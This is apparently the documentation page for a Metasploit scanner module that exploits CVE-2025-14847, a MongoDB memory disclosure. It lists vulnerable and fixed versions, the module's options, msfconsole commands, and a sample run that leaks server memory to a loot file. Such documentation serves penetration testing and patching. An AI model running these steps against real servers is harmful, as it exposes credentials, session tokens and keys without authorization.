## Vulnerable Application

This module exploits CVE-2025-14847, a memory disclosure vulnerability in MongoDB's zlib
decompression handling. By sending crafted OP_COMPRESSED messages with inflated BSON
document lengths, the server reads beyond the decompressed buffer and returns leaked
memory contents in error messages.

The vulnerability allows unauthenticated remote attackers to leak server memory which
may contain:

- Database credentials
- Session tokens
- Encryption keys
- Connection strings
- Application data

### Vulnerable Versions

- MongoDB 3.6.x, 4.0.x, 4.2.x (EOL, no fix available)
- MongoDB 4.4.0 - 4.4.29
- MongoDB 5.0.0 - 5.0.31
- MongoDB 6.0.0 - 6.0.26
- MongoDB 7.0.0 - 7.0.27
- MongoDB 8.0.0 - 8.0.16
- MongoDB 8.2.0 - 8.2.2

### Fixed Versions

- MongoDB 4.4.30+, 5.0.32+, 6.0.27+, 7.0.28+, 8.0.17+, 8.2.3+

## Verification Steps

1. Start msfconsole
2. `use auxiliary/scanner/mongodb/mongobleed`
3. `set RHOSTS <target>`
4. `run`

## Options

### MIN_OFFSET

Minimum BSON document length offset. Default: `20`

### MAX_OFFSET

Maximum BSON document length offset. Default: `8192`

### STEP_SIZE

Offset increment between probes. Default: `1`

### BUFFER_PADDING

Padding added to claimed uncompressed size. Default: `500`

### LEAK_THRESHOLD

Minimum bytes for interesting leak. Default: `10`

### QUICK_SCAN

Sample key offsets only. Default: `false`

### REPEAT

Number of scan passes. Default: `1`

## Scenarios

### MongoDB 7.0.14

```
msf6 > use auxiliary/scanner/mongodb/mongobleed
msf6 auxiliary(scanner/mongodb/mongobleed) > set RHOSTS 127.0.0.1
msf6 auxiliary(scanner/mongodb/mongobleed) > run

[*] 127.0.0.1:27017 - MongoDB version: 7.0.14
[+] 127.0.0.1:27017 - Version 7.0.14 is VULNERABLE to CVE-2025-14847
[*] 127.0.0.1:27017 - Scanning 8173 offsets (20-8192, step=1)
[+] 127.0.0.1:27017 - offset=117  len=39  : ssions...
[+] 127.0.0.1:27017 - offset=388  len=54  : ed transaction commit and skipped...

[+] 127.0.0.1:27017 - Total leaked: 126 bytes
[+] 127.0.0.1:27017 - Unique fragments: 12
[+] 127.0.0.1:27017 - Leaked data saved to: /root/.msf4/loot/mongobleed.bin
[*] Auxiliary module execution completed
```

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2025-14847>
